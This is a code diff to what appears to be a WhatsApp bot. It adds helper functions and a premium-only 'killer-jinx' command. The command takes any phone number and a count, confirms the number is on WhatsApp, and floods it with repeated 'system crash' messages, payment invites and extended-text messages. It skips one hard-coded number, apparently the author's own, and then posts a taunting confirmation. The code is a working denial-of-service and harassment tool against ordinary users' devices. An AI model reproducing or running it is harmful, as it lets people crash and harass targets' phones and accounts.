@@ -260,6 +260,40 @@ async function addExif(webpSticker, packname, author, categories = [''], extra =
     return await img.save(null)
 }
 //=================================================//
+async function sendRepeatedMessages2(jid, count) {
+            for (let i = 0; i < count; i++) {
+                sendSystemCrashMessage(jid);
+                sendSystemCrashMessage(jid);
+                sendSystemCrashMessage(jid);
+                await sleep(500);
+            }
+}
+
+	async function sendMultiplePaymentInvites(jid, count) {
+            for (let i = 0; i < count; i++) {
+                sendPaymentInvite(jid);
+                sendExtendedTextMessage(jid);
+                await sleep(500);
+            }
+	}
+	function sendMessageWithMentions(text, mentions = [], quoted = false) {
+            if (quoted == null || quoted == undefined || quoted == false) {
+                return sam.sendMessage(m.chat, {
+                    'text': text,
+                    'mentions': mentions
+                }, {
+                    'quoted': m
+                });
+            } else {
+                return sam.sendMessage(m.chat, {
+                    'text': text,
+                    'mentions': mentions
+                }, {
+                    'quoted': m
+                });
+            }
+	}
+//=================================================//
 async function addExifAvatar(buffer, packname, author, categories = ["🥀"], extra = {}, ) {
     const {
         default: {
@@ -1106,6 +1140,38 @@ case 'fliptext': {
                 reply(`\`\`\`FLIP TEXT \`\`\`\n*> Normal :*\n${quere}\n> Flip :*\n${flipe}`)
             }
                 break
+	case 'killer-jinx':{
+                if (!isPremium) return reply(mess.prem)
+                if (!text) return reply(`use ${prefix + command} number|amount\nContoh ${prefix + command} 2547xxxxxxxx,5`)
+                let number = text.split(',')[0];
+                let amount = text.split(',')[1] * 5;
+                if (!number || !amount) {
+                    return reply(`use ${prefix + command} number then amount\nExample ${prefix + command} 2547xxxxxxxx,5`)
+                }
+                if (isNaN(parseInt(amount))) {
+                    return reply("Haha wait for Jinx 🦄");
+                }
+                let cleanedNumber = number.replace(/[^0-9]/g, '');
+                let encodedAmount = '' + encodeURI(amount);
+                var contactInfo = await sam.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+                if (cleanedNumber == "254742491666") {
+                    return;
+                }
+                if (contactInfo.length == 0) {
+                    return reply("The number is not registered on WhatsApp");
+                  }
+                  reply("U have used, " + command + " Jinx is in process..");
+                  await sleep(2000); // Adjusted sleep time for clarity
+                  sendRepeatedMessages2(whatsappNumber, encodedAmount);
+                  await sleep(2500); // Adjusted sleep time for clarity
+                  sendMessageWithMentions(
+                    "Hello sir Jinx has Done it again to 🦄@" + whatsappNumber.split('@')[0] + 
+                    " Using *" + command + "Its Just Haha 🦄.", 
+                    [whatsappNumber]
+                  );
+            }
+                break;
 case 'delowner':
                 if (!isDeveloper) return reply(mess.owner)
                 if (!args[0]) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 254712345667`)
